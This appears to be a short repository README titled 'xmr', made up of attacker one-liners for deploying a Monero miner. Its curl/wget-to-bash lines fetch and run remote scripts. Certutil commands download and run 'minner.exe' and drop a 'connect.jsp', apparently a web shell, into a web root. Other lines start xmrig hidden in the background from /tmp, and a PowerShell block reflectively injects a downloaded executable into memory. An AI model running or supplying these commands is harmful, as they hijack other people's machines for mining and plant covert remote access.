# xmr
bash <(curl -s -L https://raw.githubusercontent.com/Pamentierx/xmr/main/xmr2.sh)

bash <(curl -s -L https://raw.githubusercontent.com/Pamentierx/xmr/main/zayting2.sh)
wget -q -O- https://raw.githubusercontent.com/Pamentierx/xmr/main/zayting2.sh | bash

bash <(curl -s -L https://raw.githubusercontent.com/uxbug/ant/master/ant)


./xmrig -o 127.0.0.1:8989 -u worker2 -p xx -t 1 -B --cpu-priority 3 --cpu-max-threads-hint=40% --nicehash

./xmrig -o 127.0.0.1:8989 -u worker2 -p xx -t 1 --cpu-priority 3 --cpu-max-threads-hint=40% --nicehash

certutil -urlcache -split -f https://github.com/Pamentierx/xmr/raw/main/minner.exe && minner.exe

certutil -urlcache -split -f https://raw.githubusercontent.com/Pamentierx/xmr/main/connect.jsp x:\webapps\root\connect.jsp

后台运行的命令

nohup ./程序名 &

不输出错误信息

nohup ./tmp/.xmr/xmrig >/dev/null 2>&1 &
nohup /tmp/zayting >/dev/null 2>&1 &

$b = ((New-Object System.Net.webClient).DownloadString("https://github.com/Pamentierx/xmr/raw/main/minner.exe"))
$c = [System.Convert]::FromBase64String($b)
Invoke-ReflectivePEInjection -PEBytes $c
